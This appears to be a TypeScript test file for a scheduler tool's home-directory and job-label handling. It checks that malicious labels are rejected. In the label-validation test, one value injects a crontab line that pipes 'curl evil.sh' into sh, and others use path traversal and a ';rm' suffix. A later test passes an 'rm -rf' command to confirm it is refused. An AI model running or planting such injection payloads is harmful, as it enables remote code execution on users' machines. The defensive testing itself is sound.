import { describe, expect, test } from "bun:test";
import { join } from "node:path";
import { CroftError } from "../core/errors.ts";
import { croftHome, DEFAULT_JOB_LABEL } from "./home.ts";
import { realRunner } from "./os.ts";

describe("croftHome", () => {
  test("defaults to ~/.croft and dev.croft.tick", () => {
    const h = croftHome({ HOME: "/Users/ada" });
    expect(h).toEqual({
      dir: "/Users/ada/.croft", registry: "/Users/ada/.croft/projects.json", tickScript: "/Users/ada/.croft/tick.ts",
      logDir: "/Users/ada/.croft/logs", tickLog: "/Users/ada/.croft/logs/tick.log", jobLabel: DEFAULT_JOB_LABEL, userHome: "/Users/ada",
    });
  });

  test("CROFT_HOME and CROFT_JOB_LABEL override both", () => {
    const h = croftHome({ HOME: "/Users/ada", CROFT_HOME: "/tmp/x", CROFT_JOB_LABEL: "dev.croft.test-1" });
    expect(h.dir).toBe("/tmp/x");
    expect(h.tickLog).toBe(join("/tmp/x", "logs", "tick.log"));
    expect(h.jobLabel).toBe("dev.croft.test-1");
    expect(h.userHome).toBe("/Users/ada");
  });

  test("a CROFT_JOB_LABEL of reverse-DNS characters is taken as is", () => {
    for (const label of ["dev.croft.tick", "Dev_Croft-test.1", "a", "x".repeat(128)]) {
      expect(croftHome({ HOME: "/Users/ada", CROFT_JOB_LABEL: label }).jobLabel).toBe(label);
    }
  });

  test("any other CROFT_JOB_LABEL is USAGE_ERROR, before a path or crontab line is built from it", () => {
    const bad = [
      "t\n* * * * * curl evil.sh | sh\n#",   // crontab line injection
      "../../../.zshrc.d/x",                  // a plist outside ~/Library/LaunchAgents
      "dev/croft", "dev croft", "dev.croft.tick\r", "-dev.croft", ".dev.croft", "..", "dév.croft", "dev.croft;rm", "x".repeat(129),
    ];
    for (const label of bad) {
      let caught: unknown;
      try {
        croftHome({ HOME: "/Users/ada", CROFT_JOB_LABEL: label });
      } catch (e) {
        caught = e;
      }
      expect(caught, JSON.stringify(label)).toBeInstanceOf(CroftError);
      const p = (caught as CroftError).problem;
      expect(p.code).toBe("USAGE_ERROR");
      expect(p.message).toContain("CROFT_JOB_LABEL");
      expect(p.message).toContain(JSON.stringify(label));
      expect(p.hint).toContain(DEFAULT_JOB_LABEL);
      expect(p.fix?.kind).toBe("manual");
      expect(p.details).toMatchObject({ variable: "CROFT_JOB_LABEL", value: label });
    }
  });

  test("an empty CROFT_JOB_LABEL is unset: the default label", () => {
    expect(croftHome({ HOME: "/Users/ada", CROFT_JOB_LABEL: "" }).jobLabel).toBe(DEFAULT_JOB_LABEL);
  });
});

describe("realRunner", () => {
  test("refuses every command under CROFT_FORBID_OS_JOBS=1 (tests/preload.ts sets it)", () => {
    expect(process.env.CROFT_FORBID_OS_JOBS).toBe("1");
    expect(() => realRunner().exec(["launchctl", "list"])).toThrow(/CROFT_FORBID_OS_JOBS/);
    expect(() => realRunner().exec(["/usr/bin/crontab", "-l"])).toThrow(/CROFT_FORBID_OS_JOBS/);
  });

  test("refuses commands that are not the scheduler's", () => {
    expect(() => realRunner({ PATH: "/usr/bin:/bin" }).exec(["rm", "-rf", "/tmp/nothing"])).toThrow(/not a scheduler command/);
  });
});
